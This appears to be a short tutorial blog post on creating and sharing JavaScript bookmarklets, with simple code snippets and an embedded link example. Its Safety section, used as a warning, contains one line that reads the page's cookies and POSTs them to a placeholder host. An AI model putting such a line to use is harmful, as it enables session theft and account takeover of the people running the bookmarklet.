---
social_image: null
main_image: null
tags: javascript, tutorial
published_at: 2021-06-24T09:37:51.403Z
---

# On bookmarklets and how to make them

### Bookmarklets are bookmarks which execute javascript instead of opening a new page. They are available in almost every browser, including Chrome, Firefox and most Chromium based browsers

They are pretty easy to make, and can do almost everything, including injecting other scripts, interacting with the DOM, and absolutely everything you can do with JavaScript.

## How to make a bookmarklet

That's pretty easy, just create a bookmark (using whatever method your browser has) with the following content:

```js
javascript:(() => {/* Your code goes here */})();
```

The `javascript:` part tells the browser that the bookmark is actually javascript which is to be executed.

The rest of the code is executed as normal, but you can make it an IIFE (Immediately-Invoked Function Expression) so that you don't accidentally overwrite any variables already defined. The code can be whatever you like, but on some sites (like GitHub) some action may be blocked (like injecting scripts)

![Screen Shot 2021-06-21 at 9.33.18 AM](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ncx987kc4xjr5j9togr.png)
<figcaption>I can't inject jQuery!!</figcaption>

Another neat trick is that if you make the bookmarklet return any HTML, the content of the current page will be overwritten with the HTML! (which is perfect if you want a random xkcd fetcher)

## Sharing bookmarklets

It's pretty annoying to have to copy the code for a bookmarklet if you want to use it yourself, right!

Well, 
- Bookmarklets are just URLs
- URLs can be added to the `href` of a link
- A link can be bookmarked (right click or drag to bookmarks bar)

So, if you want to put a shareable bookmark on a website, just make an `<a>` element with the `href` set to whatever code

```html
<a href="javascript:(()=>{alert('Hello, World!'); })();">Bookmark me</a>
```

Unfortunately, I can't seem to be able to add bookmarklets over here, so here's a pen with the output:

{% codepen https://codepen.io/SiddharthShyniben/pen/XWMLvYy default-tab=html,result %}

Here's some more bookmarklets which you could use:

{% codepen https://codepen.io/SiddharthShyniben/pen/BaWgXOW %}

## Safety

Bookmarklets are equal to running scripts on a page, so you have to be really careful with them.

For example, this bookmarklet could easily read cookies and post them somewhere:

```js
javascript:(() => fetch('http://cookiesnatchers.com?cookie=' + document.cookie, {method:'POST'})();
```

Once again, you have to be really careful about what bookmarklets do. 

Thanks for reading! If you have any nice bookmarklets, please share them down below! 